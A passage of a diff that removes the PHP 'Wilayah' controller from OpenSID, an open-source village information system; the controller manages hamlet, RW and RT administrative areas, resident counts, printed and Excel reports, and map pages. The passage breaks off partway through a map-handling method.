@@ -1,823 +1,473 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-use App\Enums\StatusDasarEnum;
-use App\Models\Keluarga;
-use App\Models\Pamong;
-use App\Models\Penduduk;
-use App\Models\Wilayah as WilayahModel;
-use Illuminate\Support\Facades\DB;
-use Illuminate\Support\Facades\View;
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Wilayah extends Admin_Controller
-{
-    public $modul_ini              = 'info-desa';
-    public $sub_modul_ini          = 'wilayah-administratif';
-    public $kategori_pengaturan    = 'Wilayah Administratif';
-    private array $subordinatLevel = ['dusun' => 'rw', 'rw' => 'rt'];
-    private int $parent;
-
-    public function __construct()
-    {
-        parent::__construct();
-        isCan('b');
-    }
-
-    public function index($parent = '', $level = 'dusun'): void
-    {
-        $level   = $this->input->get('level') ?? 'dusun';
-        $parent  = $this->input->get('parent') ?? '';
-        $title   = '';
-        $backUrl = ci_route('wilayah.index');
-        $wilayah = $parent ? WilayahModel::find($parent) : collect();
-
-        switch ($level) {
-            case 'rt':
-                $title   .= 'RW ' . ($wilayah->rw ?? '') . ' / ' . ucwords(setting('sebutan_dusun')) . ' ' . ($wilayah->dusun ?? '');
-                $backUrl .= '?parent=' . WilayahModel::where(['dusun' => $wilayah->dusun])->dusun()->first()->id . '&level=rw';
-                $adaUrutKosong = WilayahModel::rt()->whereRw($wilayah->rw)->where('rt', '!=', '-')->whereDusun($wilayah->dusun)->whereNull('urut')->count();
-                break;
-
-            case 'rw':
-                $title .= ucwords(setting('sebutan_dusun')) . ' ' . ($wilayah->dusun ?? '');
-                $adaUrutKosong = WilayahModel::rw()->whereDusun($wilayah->dusun)->whereNull('urut')->count();
-                break;
-
-            default:
-                $adaUrutKosong = WilayahModel::dusun()->whereNotNull('urut')->count();
-        }
-
-        $data = [
-            'parent'       => $parent,
-            'wilayah'      => $level == 'dusun' ? ucwords((string) setting('sebutan_dusun')) : strtoupper((string) $level),
-            'jabatan'      => $level == 'dusun' ? 'Kepala' : 'Ketua',
-            'level'        => $level,
-            'title'        => $title,
-            'backUrl'      => $backUrl,
-            'refreshOrder' => $adaUrutKosong,
-        ];
-
-        view('admin.wilayah.index', $data);
-    }
-
-    public function datatables()
-    {
-        if ($this->input->is_ajax_request()) {
-            $parent = $this->input->get('parent');
-            $level  = $this->input->get('level');
-
-            $subOrdinat = $this->subordinatLevel[$level] ?? '';
-
-            switch ($level) {
-                case 'rw':
-                    $mapKantor       = 'ajax_kantor_rw_maps';
-                    $mapWilayah      = 'ajax_wilayah_rw_maps';
-                    $wilayah         = WilayahModel::findOrFail($parent);
-                    $cek_lokasi_peta = cek_lokasi_peta($wilayah->toArray());
-                    $model           = WilayahModel::rw()
-                        ->whereDusun($wilayah->dusun)
-                        ->with(['kepala'])
-                        ->orderByRaw("CASE WHEN rw = '-' THEN 0 ELSE 1 END") // untuk menempatkan RW '-' di urutan paling atas
-                        ->orderBy('urut', 'ASC')
-                        ->withCount([
-                            'rts'            => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_0.rw = tweb_wil_clusterdesa.rw')),
-                            'keluargaAktif'  => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_1.rw = tweb_wil_clusterdesa.rw')),
-                            'pendudukPria'   => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_2.rw = tweb_wil_clusterdesa.rw')),
-                            'pendudukWanita' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_3.rw = tweb_wil_clusterdesa.rw')),
-                        ]);
-
-                    break;
-
-                case 'rt':
-                    $mapKantor  = 'ajax_kantor_rt_maps';
-                    $mapWilayah = 'ajax_wilayah_rt_maps';
-                    $wilayah    = WilayahModel::findOrFail($parent);
-                    $wilayahRw  = $wilayah->toArray();
-                    if ($wilayah->rw == '-') {
-                        $wilayahRw = WilayahModel::dusun()->whereDusun($wilayah->dusun)->first()->toArray();
-                    }
-                    $cek_lokasi_peta = cek_lokasi_peta($wilayahRw);
-                    $model           = WilayahModel::rt()->whereRw($wilayah->rw)->where('rt', '!=', '-')
-                        ->whereDusun($wilayah->dusun)
-                        ->with(['kepala'])
-                        ->orderBy('urut', 'ASC')
-                        ->withCount(['keluargaAktif' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_0.rw = tweb_wil_clusterdesa.rw and laravel_reserved_0.rt = tweb_wil_clusterdesa.rt')), 'pendudukPria' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_1.rw = tweb_wil_clusterdesa.rw and laravel_reserved_1.rt = tweb_wil_clusterdesa.rt')), 'pendudukWanita' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_2.rw = tweb_wil_clusterdesa.rw and laravel_reserved_2.rt = tweb_wil_clusterdesa.rt'))]);
-                    break;
-
-                default:
-                    $model           = WilayahModel::dusun()->with(['kepala'])->orderBy('urut')->withCount(['rts', 'rws' => static fn ($q) => $q->where('rw', '!=', '-'), 'keluargaAktif', 'pendudukPria', 'pendudukWanita']);
-                    $cek_lokasi_peta = cek_lokasi_peta(collect(identitas())->toArray());
-                    $mapKantor       = 'ajax_kantor_dusun_maps';
-                    $mapWilayah      = 'ajax_wilayah_dusun_maps';
-            }
-
-            return datatables()->of($model)
-                ->addIndexColumn()
-                ->addColumn('drag-handle', static fn (): string => '<i class="fa fa-sort-alpha-desc"></i>')
-                ->addColumn('aksi', static function ($row) use ($parent, $mapKantor, $mapWilayah, $level, $subOrdinat, $cek_lokasi_peta): string {
-                    $aksi = '';
-                    if ($level != 'rt') {
-                        $aksi .= View::make('admin.layouts.components.tombol_detail', [
-                            'url' => ci_route('wilayah.index') . '?parent=' . $row->id . '&level=' . $subOrdinat,
-                        ])->render();
-                    }
-                    if (can('u')) {
-                        if ($level == 'rw') {
-                            if ($row->rw != '-') {
-                                $aksi .= View::make('admin.layouts.components.buttons.edit', [
-                                    'url' => 'wilayah/form_' . $level . "/{$parent}/{$row->id}",
-                                ])->render();
-                            }
-                        } else {
-                            $aksi .= View::make('admin.layouts.components.buttons.edit', [
-                                'url' => 'wilayah/form_' . $level . "/{$parent}/{$row->id}",
-                            ])->render();
-                        }
-                    }
-                    if (can('h')) {
-                        if ($level == 'rw') {
-                            if ($row->rw != '-') {
-                                $aksi .= View::make('admin.layouts.components.buttons.hapus', [
-                                    'url'           => ci_route('wilayah.delete', "{$level}/{$row->id}/{$parent}"),
-                                    'confirmDelete' => true,
-                                ])->render();
-                            }
-                        } else {
-                            $aksi .= View::make('admin.layouts.components.buttons.hapus', [
-                                'url'           => ci_route('wilayah.delete', "{$level}/{$row->id}/{$parent}"),
-                                'confirmDelete' => true,
-                            ])->render();
-                        }
-                    }
-                    if ($level == 'dusun' && $row->dusun == '-') {
-                        $cek_lokasi_peta = false;
-                    }
-                    if ($cek_lokasi_peta && can('u')) {
-                        $wilayah = $level == 'dusun' ? ucwords((string) setting('sebutan_dusun')) : strtoupper($level);
-                        if (! ($level == 'rw' && $row->rw == '-')) {
-                            $aksi .= '<div class="btn-group">
-                                <button type="button" class="btn btn-social btn-info btn-sm" data-toggle="dropdown"><i class="fa fa-arrow-circle-down"></i> Peta</button>
-                                <ul class="dropdown-menu" role="menu">
-                                    <li>
-                                        <a href="' . ci_route('wilayah.' . $mapKantor, "{$row->id}/{$parent}") . '" class="btn btn-social btn-block btn-sm"><i class="fa fa-map-marker"></i> Lokasi Kantor ' . $wilayah . '</a>
-                                    </li>
-                                    <li>
-                                        <a href="' . ci_route('wilayah.' . $mapWilayah, "{$row->id}/{$parent}") . '" class="btn btn-social btn-block btn-sm"><i class="fa fa-map"></i> Peta Wilayah ' . $wilayah . '</a>
-                                    </li>
-                                </ul>
-                            </div>';
-                        }
-                    }
-
-                    return $aksi;
-                })
-                ->addColumn('penduduk_count', static fn ($row): string => $level == 'dusun' ? '<a href="' . ci_route('wilayah.warga', $row->id) . '">' . ($row->penduduk_pria_count + $row->penduduk_wanita_count) . '</a>' : '<span>' . ($row->penduduk_pria_count + $row->penduduk_wanita_count) . '</span>')
-                ->editColumn('rts_count', static fn ($row): string => $level == 'rw' ? '<a href="' . ci_route('wilayah.index') . '?parent=' . $row->id . '&level=' . $subOrdinat . '" title="Rincian">' . ($row->rts_count ?? '') . '</a>' : '<span>' . ($row->rts_count ?? '') . '</span>')
-                ->editColumn('rws_count', static fn ($row): string => $level == 'dusun' ? '<a href="' . ci_route('wilayah.index') . '?parent=' . $row->id . '&level=' . $subOrdinat . '" title="Rincian">' . ($row->rws_count ?? '') . '</a>' : '<span>' . ($row->rws_count ?? '') . '</span>')
-                ->editColumn('keluarga_aktif_count', static fn ($row): string => $level == 'dusun' ? '<a href="' . ci_route('wilayah.warga_kk', $row->id) . '">' . ($row->keluarga_aktif_count ?? '') . '</a>' : '<span>' . ($row->keluarga_aktif_count ?? '') . '</span>')
-                ->editColumn('penduduk_pria_count', static fn ($row): string => $level == 'dusun' ? '<a href="' . ci_route('wilayah.warga_l', $row->id) . '">' . ($row->penduduk_pria_count ?? '') . '</a>' : '<span>' . ($row->penduduk_pria_count ?? '') . '</span>')
-                ->editColumn('penduduk_wanita_count', static fn ($row): string => $level == 'dusun' ? '<a href="' . ci_route('wilayah.warga_p', $row->id) . '">' . ($row->penduduk_wanita_count ?? '') . '</a>' : '<span>' . ($row->penduduk_wanita_count ?? '') . '</span>')
-                ->editColumn('kepala', static fn ($row): string => '<strong>' . $row->kepala->nama . '</strong>' ?? '')
-                ->addColumn('nik_kepala', static fn ($row): string => $row->kepala->nik ?? '')
-                ->rawColumns(['drag-handle', 'aksi', 'ceklist', 'kepala', 'penduduk_count', 'rts_count', 'rws_count', 'keluarga_aktif_count', 'penduduk_wanita_count', 'penduduk_pria_count'])
-                ->make();
-        }
-
-        return show_404();
-    }
-
-    public function tukar()
-    {
-        isCan('u');
-        $wilayah = $this->input->post('data');
-        if ($wilayah) {
-            WilayahModel::setNewOrder($wilayah);
-            WilayahModel::updateUrutan();
-        }
-
-        return json(['status' => 1]);
-    }
-
-    // $aksi = cetak/unduh
-    public function dialog($aksi = 'cetak'): void
-    {
-        $data                = $this->modal_penandatangan();
-        $data['aksi']        = $aksi;
-        $data['form_action'] = ci_route("{$this->controller}.daftar.{$aksi}");
-        view('admin.layouts.components.ttd_pamong', $data);
-    }
-
-    // $aksi = cetak/unduh
-    public function daftar($aksi = 'cetak'): void
-    {
-        $data['aksi']           = $aksi;
-        $data['pamong_ttd']     = Pamong::selectData()->where(['pamong_id' => $this->input->post('pamong_ttd')])->first()->toArray();
-        $data['pamong_ketahui'] = Pamong::selectData()->where(['pamong_id' => $this->input->post('pamong_ketahui')])->first()->toArray();
-        $data['dusuns']         = WilayahModel::dusun()->with([
-            'kepala', 'rws' => static fn ($q) => $q->orderBy('urut')->with([
-                'kepala', 'rts' => static fn ($q) => $q->orderBy('urut')->with('kepala')->withCount([
-                    'keluargaAktif' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_9.rw = tweb_wil_clusterdesa.rw and laravel_reserved_9.rt = tweb_wil_clusterdesa.rt')), 'pendudukPria' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_10.rw = tweb_wil_clusterdesa.rw and laravel_reserved_10.rt = tweb_wil_clusterdesa.rt')), 'pendudukWanita' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_11.rw = tweb_wil_clusterdesa.rw and laravel_reserved_11.rt = tweb_wil_clusterdesa.rt')),
-                ]),
-            ])->withCount([
-                'rts' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_5.rw = tweb_wil_clusterdesa.rw')), 'keluargaAktif' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_6.rw = tweb_wil_clusterdesa.rw')), 'pendudukPria' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_7.rw = tweb_wil_clusterdesa.rw')), 'pendudukWanita' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_8.rw = tweb_wil_clusterdesa.rw')),
-            ]),
-        ])->orderBy('urut')->withCount(['rts', 'rws' => static fn ($q) => $q->where('rw', '!=', '-'), 'keluargaAktif', 'pendudukPria', 'pendudukWanita'])->get();
-
-        if ($aksi == 'unduh') {
-            header('Content-type: application/octet-stream');
-            header('Content-Disposition: attachment; filename=wilayah_' . date('Y-m-d') . '.xls');
-            header('Pragma: no-cache');
-            header('Expires: 0');
-        }
-        view('admin.wilayah.wilayah_cetak', $data);
-    }
-
-    public function form_dusun(?int $id = null): void
-    {
-        $this->form('dusun', $id);
-    }
-
-    public function form_rw(int $parent, $id = ''): void
-    {
-        $this->parent = $parent;
-        $this->form('rw', $id);
-    }
-
-    public function form_rt(int $parent, $id = ''): void
-    {
-        $this->parent = $parent;
-        $this->form('rt', $id);
-    }
-
-    public function apipendudukwilayah()
-    {
-        $filter = [
-            'status_dasar' => $this->input->get('filter_status'),
-        ];
-
-        if ($this->input->is_ajax_request()) {
-            $cari     = $this->input->get('q');
-            $penduduk = Penduduk::select(['id', 'nik', 'nama', 'id_cluster', 'status_dasar'])
-                ->when($cari, static function ($query) use ($cari): void {
-                    $query->where(static function ($query) use ($cari): void {
-                        $query->where('nik', 'like', "%{$cari}%")
-                            ->orWhere('nama', 'like', "%{$cari}%");
-                    });
-                })
-                ->when(
-                    (int) $filter['status_dasar'] === StatusDasarEnum::HIDUP,
-                    static function ($query): void {
-                        $query->where('status_dasar', StatusDasarEnum::HIDUP);
-                    }
-                )
-                ->paginate(10);
-
-            return json([
-                'results' => collect($penduduk->items())
-                    ->map(static fn ($item): array => [
-                        'id'   => $item->id,
-                        'text' => 'NIK : ' . $item->nik . ' - ' . $item->nama . ' RT-' . $item->wilayah->rt . ', RW-' . $item->wilayah->rw . ', ' . strtoupper(setting('sebutan_dusun') . ' ' . $item->wilayah->dusun),
-                    ]),
-                'pagination' => [
-                    'more' => $penduduk->currentPage() < $penduduk->lastPage(),
-                ],
-            ]);
-        }
-
-        return show_404();
-    }
-
-    public function insert(string $level, ?int $parent = null): void
-    {
-        isCan('u');
-
-        try {
-            $data      = $this->bersihkan_data($this->request);
-            $parentObj = $parent ? WilayahModel::find($parent) : null;
-
-            switch ($level) {
-                case 'dusun':
-                    WilayahModel::create($data);
-                    // insert rw
-                    $data['rw'] = '-';
-                    WilayahModel::create($data);
-                    // insert rt
-                    $data['rt'] = '-';
-                    WilayahModel::create($data);
-                    break;
-
-                case 'rw':
-                    $data['dusun'] = $parentObj->dusun;
-                    $sudahAda      = WilayahModel::where(['dusun' => $data['dusun'], 'rw' => $data['rw']])->count();
-                    if ($sudahAda) {
-                        redirect_with('error', 'Data wilayah RW tersebut sudah ada', ci_route('wilayah.index') . '?level=' . $level . '&parent=' . $parent);
-                    }
-                    WilayahModel::create($data);
-                    // insert rt
-                    $data['rt'] = '-';
-                    WilayahModel::create($data);
-                    break;
-
-                case 'rt':
-                    $data['dusun'] = $parentObj->dusun;
-                    $data['rw']    = $parentObj->rw;
-                    $sudahAda      = WilayahModel::where(['dusun' => $data['dusun'], 'rw' => $data['rw'], 'rt' => $data['rt']])->count();
-                    if ($sudahAda) {
-                        redirect_with('error', 'Data wilayah RT tersebut sudah ada', ci_route('wilayah.index') . '?level=' . $level . '&parent=' . $parent);
-                    }
-                    WilayahModel::create($data);
-                    break;
-            }
-
-            redirect_with('success', 'Data wilayah berhasil disimpan', ci_route('wilayah.index') . '?level=' . $level . '&parent=' . $parent);
-        } catch (Exception $e) {
-            log_message('error', $e->getMessage());
-            redirect_with('error', 'Data wilayah gagal disimpan', ci_route('wilayah.index') . '?level=' . $level . '&parent=' . $parent);
-        }
-    }
-
-    public function update(string $level, $id = '', ?int $parent = null): void
-    {
-        try {
-            $data = $this->bersihkan_data($this->request);
-            $obj  = WilayahModel::find($id);
-
-            // update nama wilayah yang di bawahnya, karena hubungan parent - child diidentifikasi berdasarkan nama
-            switch ($level) {
-                case 'dusun':
-                    // update rw dan rt di bawahnya
-                    WilayahModel::whereDusun($obj->dusun)->update(['dusun' => $data['dusun']]);
-                    unset($data['rt'], $data['rw']);
-
-                    $obj->update($data);
-
-                    // update data id_kepala di dusun
-                    WilayahModel::whereDusun($obj->dusun)->whereRw('-')->update(['id_kepala' => $data['id_kepala']]);
-                    break;
-
-                case 'rw':
-                    // update rt di bawahnya
-                    WilayahModel::whereDusun($obj->dusun)->whereRw($obj->rw)->update(['rw' => $data['rw']]);
-                    unset($data['dusun'], $data['rt']);
-
-                    $obj->update($data);
-
-                    // update data id_kepala di rw
-                    WilayahModel::whereDusun($obj->dusun)->whereRw($obj->rw)->whereRt('-')->update(['id_kepala' => $data['id_kepala']]);
-                    break;
-
-                default:
-                    unset($data['dusun'], $data['rw']);
-
-                    $obj->update($data);
-            }
-
-            redirect_with('success', 'Data wilayah berhasil disimpan', ci_route('wilayah.index') . '?level=' . $level . '&parent=' . $parent);
-        } catch (Exception $e) {
-            log_message('error', $e->getMessage());
-            redirect_with('error', 'Data wilayah gagal disimpan', ci_route('wilayah.index') . '?level=' . $level . '&parent=' . $parent);
-        }
-    }
-
-    //Delete dusun/rw/rt tergantung tipe
-    public function delete(string $level, int $id, ?int $parent = null): void
-    {
-        isCan('h');
-        // Perlu hapus berdasarkan nama, supaya baris RW dan RT juga terhapus
-        $wilayah = WilayahModel::find($id) ?? show_404();
-
-        switch ($level) {
-            case 'dusun':
-                $id_cluster = WilayahModel::where('dusun', $wilayah->dusun)->pluck('id')->toArray();
-                $nama       = setting('sebutan_dusun') . ' ' . $wilayah->dusun;
-                break;
-
-            case 'rw':
-                $id_cluster        = WilayahModel::where('rw', '!=', '-')->where('rw', $wilayah->rw)->where('dusun', $wilayah->dusun)->pluck('id')->toArray();
-                $nama              = 'RW ' . $wilayah->rw . ' ' . setting('sebutan_dusun') . ' ' . $wilayah->dusun;
-                $this->session->rw = $wilayah->rw;
-                break;
-
-            default:
-                $id_cluster        = [$id];
-                $nama              = 'RT ' . $wilayah->rw . ' ' . 'RW ' . $wilayah->rw . ' ' . setting('sebutan_dusun') . ' ' . $wilayah->dusun;
-                $this->session->rt = $wilayah->rt;
-                $this->session->rw = $wilayah->rw;
-                break;
-        }
-        // Hitung semua penduduk di wilayah tersebut
-        $penduduk = Penduduk::whereIn('id_cluster', $id_cluster)->count();
-
-        // Hitung keluarga yang VALID (memiliki nik_kepala yang terhubung ke penduduk)
-        $keluarga = Keluarga::whereIn('id_cluster', $id_cluster)
-            ->whereNotNull('nik_kepala')
-            ->whereHas('kepalaKeluarga')
-            ->count();
-
-        $this->session->dusun = $wilayah->dusun;
-
-        $url_penduduk = ci_route('penduduk', "?status_dasar=\"\"&dusun={$wilayah->dusun}");
-        $url_keluarga = ci_route('keluarga', "?dusun={$wilayah->dusun}");
-
-        if ($penduduk + $keluarga > 0) {
-            redirect_with(
-                'error',
-                "
-                    {$nama} tidak dapat dihapus karena hal berikut:
-                    <ol>
-                        <li>Terdapat penduduk dengan status mati, pindah, hilang, pergi dan tidak valid</li>
-                        <li>Terdapat kelurga dengan status KK Hilang/Pindah/Mati dan KK Kosong</li>
-                    </ol>
-                    Silakan hapus data atau pindahkan data secara kolektif yang ada pada <a href='{$url_penduduk}' target='_blank'>Penduduk</a> atau <a href='{$url_keluarga}' target='_blank'>Keluarga</a> terlebih dahulu.
-                ",
-                ci_route('wilayah.index') . "?level={$level}&parent={$parent}",
-                true
-            );
-        }
-
-        WilayahModel::whereIn('id', $id_cluster)->delete();
-        redirect_with('success', $nama . ' berhasil dihapus');
-    }
-
-    public function cetak_rw(int $id): void
-    {
-        $dusun         = WilayahModel::find($id);
-        $data['aksi']  = 'cetak';
-        $data['dusun'] = $dusun->dusun;
-        $data['rws']   = WilayahModel::rw()->whereDusun($dusun->dusun)->with(['kepala'])->orderBy('urut')
-            ->withCount(['rts' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_0.rw = tweb_wil_clusterdesa.rw')), 'keluargaAktif' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_1.rw = tweb_wil_clusterdesa.rw')), 'pendudukPria' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_2.rw = tweb_wil_clusterdesa.rw')), 'pendudukWanita' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_3.rw = tweb_wil_clusterdesa.rw'))])
-            ->get();
-
-        view('admin.wilayah.wilayah_rw_cetak', $data);
-    }
-
-    public function unduh_rw(int $id): void
-    {
-        header('Content-type: application/octet-stream');
-        header('Content-Disposition: attachment; filename=wilayah_rw_' . date('Y-m-d') . '.xls');
-        header('Pragma: no-cache');
-        header('Expires: 0');
-
-        $this->cetak_rw($id);
-    }
-
-    public function cetak_rt(int $id): void
-    {
-        $rw            = WilayahModel::find($id);
-        $data['aksi']  = 'cetak';
-        $data['dusun'] = $rw->dusun;
-        $data['rts']   = WilayahModel::rt()->whereRw($rw->rw)->where('rt', '!=', '-')->whereDusun($rw->dusun)->with(['kepala'])->orderBy('urut')
-            ->withCount(['keluargaAktif' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_0.rw = tweb_wil_clusterdesa.rw and laravel_reserved_0.rt = tweb_wil_clusterdesa.rt')), 'pendudukPria' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_1.rw = tweb_wil_clusterdesa.rw and laravel_reserved_1.rt = tweb_wil_clusterdesa.rt')), 'pendudukWanita' => static fn ($q) => $q->whereRaw(DB::raw('laravel_reserved_2.rw = tweb_wil_clusterdesa.rw and laravel_reserved_2.rt = tweb_wil_clusterdesa.rt'))])
-            ->get();
-
-        view('admin.wilayah.wilayah_rt_cetak', $data);
-    }
-
-    public function unduh_rt(int $id): void
-    {
-        header('Content-type: application/octet-stream');
-        header('Content-Disposition: attachment; filename=wilayah_rt_' . date('Y-m-d') . '.xls');
-        header('Pragma: no-cache');
-        header('Expires: 0');
-
-        $this->cetak_rt($id);
-    }
-
-    public function warga($id = ''): void
-    {
-        $temp = WilayahModel::find($id)->toArray();
-        redirect('penduduk?dusun=' . $temp['dusun']);
-    }
-
-    public function warga_kk($id = ''): void
-    {
-        $temp = WilayahModel::find($id)->toArray();
-        redirect('keluarga?dusun=' . $temp['dusun']);
-    }
-
-    public function warga_l($id = ''): void
-    {
-        $temp = WilayahModel::find($id)->toArray();
-        redirect('penduduk?dusun=' . $temp['dusun'] . '&sex=1');
-    }
-
-    public function warga_p($id = ''): void
-    {
-        $temp = WilayahModel::find($id)->toArray();
-        redirect('penduduk?dusun=' . $temp['dusun'] . '&sex=2');
-    }
-
-    public function ajax_kantor_dusun_maps(int $id): void
-    {
-        $data['wil_atas'] = $this->header['desa'];
-        $sebutan_desa     = ucwords((string) setting('sebutan_desa'));
-        $namadesa         = $data['wil_atas']['nama_desa'];
-
-        $this->ubah_lokasi_peta($data['wil_atas'], 'index', "Lokasi Kantor {$sebutan_desa} {$namadesa} Belum Dilengkapi");
-
-        $data['poly']    = 'multi';
-        $data['wil_ini'] = WilayahModel::find($id)->toArray();
-
-        $data['dusun_gis']    = WilayahModel::dusun()->get()->toArray();
-        $data['rw_gis']       = WilayahModel::rw()->get()->toArray();
-        $data['rt_gis']       = WilayahModel::rt()->get()->toArray();
-        $data['nama_wilayah'] = ucwords(setting('sebutan_dusun') . ' ' . $data['wil_ini']['dusun'] . ' ' . $sebutan_desa . ' ' . $data['wil_atas']['nama_desa']);
-        $data['wilayah']      = ucwords((string) setting('sebutan_dusun'));
-        $data['breadcrumb']   = [
-            ['link' => ci_route('wilayah'), 'judul' => 'Daftar ' . $data['wilayah']],
-        ];
-        $data['form_action'] = ci_route("{$this->controller}.update_kantor_map", "dusun/{$id}");
-        $data['logo']        = $this->header['desa'];
-
-        view('admin.wilayah.maps_kantor', $data);
-    }
-
-    public function ajax_wilayah_dusun_maps(int $id): void
-    {
-        $data['wil_atas'] = $this->header['desa'];
-        $sebutan_desa     = ucwords((string) setting('sebutan_desa'));
-        $namadesa         = $data['wil_atas']['nama_desa'];
-        $this->ubah_lokasi_peta($data['wil_atas'], 'index', "Peta Wilayah {$sebutan_desa} {$namadesa} Belum Dilengkapi");
-
-        $data['poly']         = 'multi';
-        $data['wil_ini']      = WilayahModel::find($id)->toArray();
-        $data['dusun_gis']    = WilayahModel::dusun()->get()->toArray();
-        $data['rw_gis']       = WilayahModel::rw()->get()->toArray();
-        $data['rt_gis']       = WilayahModel::rt()->get()->toArray();
-        $data['nama_wilayah'] = ucwords(setting('sebutan_dusun') . ' ' . $data['wil_ini']['dusun'] . ' ' . $sebutan_desa . ' ' . $data['wil_atas']['nama_desa']);
-        $data['wilayah']      = ucwords((string) setting('sebutan_dusun'));
-        $data['breadcrumb']   = [
-            ['link' => ci_route('wilayah'), 'judul' => 'Daftar ' . $data['wilayah']],
-        ];
-        $data['form_action']     = ci_route("{$this->controller}.update_wilayah_map", "dusun/{$id}");
-        $data['logo']            = $this->header['desa'];
-        $data['route_kosongkan'] = ci_route('wilayah.kosongkan', $id);
-        view('admin.wilayah.maps_wilayah', $data);
-    }
-
-    public function ajax_kantor_rw_maps(int $id, int $id_dusun): void
-    {
-        $data['wil_atas'] = WilayahModel::find($id_dusun)->toArray();
-        $sebutan_dusun    = ucwords((string) setting('sebutan_dusun'));
-        $dusun            = $data['wil_atas']['dusun'];
-        $this->ubah_lokasi_peta($data['wil_atas'], "index?level=rw&parent={$id_dusun}", "Lokasi Kantor {$sebutan_dusun} {$dusun} Belum Dilengkapi");
-
-        $data['wil_ini']   = WilayahModel::find($id)->toArray();
-        $data['dusun_gis'] = WilayahModel::dusun()->get()->toArray();
-        $data['rw_gis']    = WilayahModel::rw()->get()->toArray();
-        $data['rt_gis']    = WilayahModel::rt()->get()->toArray();
-
-        $data['nama_wilayah'] = 'RW ' . $data['wil_ini']['rw'] . ' ' . $sebutan_dusun . ' ' . $dusun;
-        $data['breadcrumb']   = [
-            ['link' => ci_route('wilayah'), 'judul' => 'Daftar ' . $sebutan_dusun],
-            ['link' => ci_route("{$this->controller}.index?level=rw&parent={$id_dusun}"), 'judul' => 'Daftar RW'],
-        ];
-        $data['wilayah']     = 'RW';
-        $data['form_action'] = ci_route("{$this->controller}.update_kantor_map", "rw/{$id}/{$id_dusun}");
-        $data['logo']        = $this->header['desa'];
-
-        view('admin.wilayah.maps_kantor', $data);
-    }
-
-    public function ajax_wilayah_rw_maps(int $id, int $id_dusun): void
-    {
-        $data['wil_atas'] = WilayahModel::find($id_dusun)->toArray();
-        $sebutan_dusun    = ucwords((string) setting('sebutan_dusun'));
-        $dusun            = $data['wil_atas']['dusun'];
-        $this->ubah_lokasi_peta($data['wil_atas'], "index?level=rw&parent={$id_dusun}", "Peta Wilayah {$sebutan_dusun} {$dusun} Belum Dilengkapi");
-
-        $data['wil_ini']      = WilayahModel::find($id)->toArray();
-        $data['dusun_gis']    = WilayahModel::dusun()->get()->toArray();
-        $data['rw_gis']       = WilayahModel::rw()->get()->toArray();
-        $data['rt_gis']       = WilayahModel::rt()->get()->toArray();
-        $dusun                = $data['wil_atas']['dusun'];
-        $data['nama_wilayah'] = 'RW ' . $data['wil_ini']['rw'] . ' ' . $sebutan_dusun . ' ' . $dusun;
-        $data['breadcrumb']   = [
-            ['link' => ci_route('wilayah'), 'judul' => 'Daftar ' . $sebutan_dusun],
-            ['link' => ci_route("{$this->controller}.index?level=rw&parent={$id_dusun}"), 'judul' => 'Daftar RW'],
-        ];
-        $data['wilayah']         = 'RW';
-        $data['form_action']     = ci_route("{$this->controller}.update_wilayah_map", "rw/{$id}/{$id_dusun}");
-        $data['logo']            = $this->header['desa'];
-        $data['route_kosongkan'] = ci_route('wilayah.kosongkan', $id);
-        view('admin.wilayah.maps_wilayah', $data);
-    }
-
-    public function ajax_kantor_rt_maps(int $id, int $id_rw): void
-    {
-        $dataRW           = WilayahModel::find($id_rw)->toArray();
-        $data['wil_atas'] = $dataRW;
-        $id_dusun         = WilayahModel::dusun()->whereDusun($dataRW['dusun'])->first()->id;
-        if ($dataRW['rw'] == '-') {
-            $data['wil_atas'] = WilayahModel::find($id_dusun)->toArray();
